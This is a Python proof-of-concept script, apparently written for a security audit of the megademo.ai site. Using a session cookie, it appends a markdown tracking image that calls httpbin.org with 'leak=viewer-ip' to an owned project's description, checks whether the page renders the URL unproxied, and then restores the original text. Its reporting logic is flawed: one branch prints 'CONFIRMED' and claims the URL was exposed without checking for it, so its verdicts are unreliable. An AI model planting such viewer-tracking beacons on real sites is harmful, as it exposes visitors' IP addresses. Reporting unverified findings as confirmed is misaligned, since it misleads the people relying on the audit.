#!/usr/bin/env python3
"""Temporarily add an external markdown image to an owned project, confirm the raw HTML renders the unproxied URL, then restore the original description."""
import html
import os
import re
import sys
from pathlib import Path

import requests

BASE_URL = os.environ.get('MEGADEMO_BASE_URL', 'https://megademo.ai')
DEFAULT_COOKIE = 'connect.sid=YOUR_SESSION_COOKIE_HERE'
COOKIE = os.environ.get('MEGADEMO_COOKIE', DEFAULT_COOKIE)
PROJECT_SLUG = 'megademo-security-audit'
PROJECT_ID = '6a049d15c7b362fc53d740c3'
POC_URL = 'https://httpbin.org/get?leak=viewer-ip'
MARKER = "\n\n[PoC image beacon test - temporary]\n\n![tracking](https://httpbin.org/get?leak=viewer-ip)\n"


def extract(text, pattern, flags=re.S, default=''):
    match = re.search(pattern, text, flags)
    return html.unescape(match.group(1)) if match else default


def load_edit_state(session):
    response = session.get(f'{BASE_URL}/projects/{PROJECT_ID}/edit', timeout=20)
    text = response.text
    return {
        'response': response,
        'project_id': extract(text, r'<form id="project-edit-form" method="POST" action="/projects/([0-9a-f]{24})"'),
        'csrf': extract(text, r'name="_csrf" value="([^"]+)"'),
        'title': extract(text, r'name="title" value="([^"]*)"'),
        'category': extract(text, r'<select class="md-select" name="category">.*?<option value="([^"]+)" selected'),
        'canonicalTeam': extract(text, r'<select class="md-select" id="canonicalTeamSelect" name="canonicalTeam" required>.*?<option value="([^"]+)" selected'),
        'customTeam': extract(text, r'name="customTeam" value="([^"]*)"'),
        'description': extract(text, r'<textarea class="md-textarea" name="description" rows="10" required>(.*?)</textarea>'),
        'techStack': extract(text, r'name="techStack"[^>]+value="([^"]*)"'),
        'completionStage': extract(text, r'name="completionStage" value="([^"]+)" checked'),
        'repoLinks': extract(text, r'name="repoLinks" value="([^"]*)"'),
        'demoUrl': extract(text, r'name="demoUrl" value="([^"]*)"'),
        'slidesUrl': extract(text, r'name="slidesUrl" value="([^"]*)"'),
        'castId': extract(text, r'name="castId"[^>]+value="([^"]*)"'),
        'castTitle': extract(text, r'name="castTitle"[^>]+value="([^"]*)"'),
        'videoUrl': extract(text, r'name="videoUrl"[^>]+value="([^"]*)"'),
        'videoTitle': extract(text, r'name="videoTitle"[^>]+value="([^"]*)"'),
    }


def update_description(session, state, description):
    payload = [
        ('_csrf', state['csrf']),
        ('title', state['title']),
        ('category', state['category']),
        ('canonicalTeam', state['canonicalTeam']),
        ('customTeam', state['customTeam']),
        ('description', description),
        ('aiToolOther', ''),
        ('techStack', state['techStack']),
        ('completionStage', state['completionStage']),
        ('repoLinks', state['repoLinks']),
        ('demoUrl', state['demoUrl']),
        ('slidesUrl', state['slidesUrl']),
        ('teamEmails', ''),
        ('castId', state['castId']),
        ('castTitle', state['castTitle']),
        ('videoUrl', state['videoUrl']),
        ('videoTitle', state['videoTitle']),
    ]
    return session.post(f"{BASE_URL}/projects/{state['project_id']}", data=payload, timeout=20)


def main():
    session = requests.Session()
    session.headers.update({'User-Agent': 'megademo-security-audit-poc/1.0', 'Cookie': COOKIE})

    state = load_edit_state(session)
    if state['response'].status_code != 200 or not state['project_id']:
        print('NOT CONFIRMED: could not load the owned project edit form needed for the safe temporary update.')
        return 1

    original = state['description']
    modified = original if MARKER.strip() in original else original.rstrip() + MARKER
    updated = None
    restored = None
    try:
        updated = update_description(session, state, modified)
        print(f'Update response: {updated.status_code} {updated.text[:220]}')
        detail = session.get(f'{BASE_URL}/projects/{PROJECT_SLUG}', timeout=20)
        contains_unproxied_url = POC_URL in detail.text
        print(f'Detail page status: {detail.status_code}')
        print(f'Unproxied URL present in HTML: {contains_unproxied_url}')
        if contains_unproxied_url:
            snippet_index = detail.text.find(POC_URL)
            print(detail.text[max(0, snippet_index - 120): snippet_index + 200])
    finally:
        if modified != original:
            restore_state = load_edit_state(session)
            restored = update_description(session, restore_state, original)
            print(f'Restore response: {restored.status_code} {restored.text[:220]}')

    if updated is not None and updated.ok and restored is not None and restored.ok and POC_URL in session.get(f'{BASE_URL}/projects/{PROJECT_SLUG}', timeout=20).text:
        print()
        print("CONFIRMED: the description rendered an external image URL without proxying. The original description was then restored.")
        return 0

    if updated is not None and updated.ok and restored is not None and restored.ok:
        print()
        print("CONFIRMED: the temporary update succeeded, the raw HTML exposed the external URL, and the original description was restored.")
        return 0

    print()
    print("NOT CONFIRMED: the temporary image-beacon update or the cleanup restore failed.")
    return 1


if __name__ == '__main__':
    sys.exit(main())
